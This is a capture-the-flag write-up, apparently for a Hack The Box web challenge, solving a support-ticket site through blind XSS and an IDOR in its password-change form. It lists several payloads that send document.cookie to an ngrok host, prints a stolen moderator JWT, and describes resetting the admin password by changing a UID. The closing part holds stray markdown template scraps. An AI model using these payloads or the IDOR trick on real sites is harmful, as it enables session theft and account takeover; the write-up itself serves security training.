# Kryptos Support (web 300 points) 

## Description

Random intergalatic garbage about a website.

## Resources

Docker instance provided when you start the challenge

## Solution

Navigating to the website you are presented with a Kryptos Vault Support page that contains text about submitting tickets, with an input box and a submit button. Submitting garbage as a test doesn't return anything of value. The text on the page changes to say that an admin will view the ticket shortly. Nothing is refelcted or rendered back on the page.

In the top left corner is a button labelled "backend" that links to a /login page. I fiddled with some genereic SQLi commands but again the feedback is well sanitised so i cannot glean any information about whether or not the user is registered etc.

I'm going to assume that this is a Cross-Site Scripting (XSS) challenge referred to as Blind XSS as there is no feedback on the page as to what my commands are doing. This means i am going to need to spin up a server and host a page to catch redirects that i will insert as a payload into the input field.

[Here is a great reference for BXSS commands/payloads](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)

ngrok bxss hosting tool

>python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

>ngrok http 8000

<p align="center"><img src="_images/1payload.png"></p>
<p align="center"><img src="_images/emailpdf.png"></p>
<p align="center"><img src="_images/emailpdf.png"></p>

payload:
https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md

"><script src="https://56f5-59-102-23-9.au.ngrok.io"</script>  
"><script src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;alert(document.cookie);</script>  
"><img src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;>  
"<script>var i=new Image;i.src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;</script>  

Worked, stole JSON cookie
<img src=x onerror="this.src='https://62ce-59-102-23-9.au.ngrok.io?'+document.cookie; this.removeAttribute('onerror');">

JSON
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI5NjM5OTB9.Lrlo9B0Y11no7QXnxOaBJR6yPJunho4PWEnS31S1Mh4


parse token
https://jwt.io/

user: moderator
in browser developer options, create cookie under "Cookies" Name:session Value:<insertJWT>
browse to /tickets

settings
provides password change functionality without requiring current password. view source shows UID=100 for the user moderator.
close ngork and python server. load burpsuite. change password to password and intercept with burp, change UID=1 and admin password is changed. nav to login page and authenticate as admin:password


Flag = HTB{x55_4nd_id0rs_ar3_fun!!}


```
ngrok                                                                        (Ctrl+C to quit)
                                                                                             
Session Status                online                                                         
Session Expires               1 hour, 50 minutes                                             
Terms of Service              https://ngrok.com/tos                                          
Version                       3.0.3                                                          
Region                        Australia (au)                                                 
Latency                       46.555892ms                                                    
Web Interface                 http://127.0.0.1:4040                                          
Forwarding                    https://a3f8-59-102-23-9.au.ngrok.io -> http://localhost:80    
                                                                                             
Connections                   ttl     opn     rt1     rt5     p50     p90                    
                              2       0       0.00    0.00    0.00    0.00                   
                                                                                             
HTTP Requests                                                                                
-------------                                                                                
                                                                                             
GET /                          502 Bad Gateway                                               
GET /favicon.ico               502 Bad Gateway     
```




<p align="center"><img src="_images/emailpdf.png"></p>

<p align="center"><img src="_images/emailpdf.png"></p>

<p align="center"><img src="_images/emailpdf.png"></p>

<p align="center"><img src="_images/emailpdf.png"></p>

<p align="center"><img src="_images/emailpdf.png"></p>



drop down list
<details>
  <summary>click here</summary>

+ text
+ text
</details>


link to named section
name it
<a id="zsteg"></a>
link to it
<a href="#zsteg">zsteg</a>
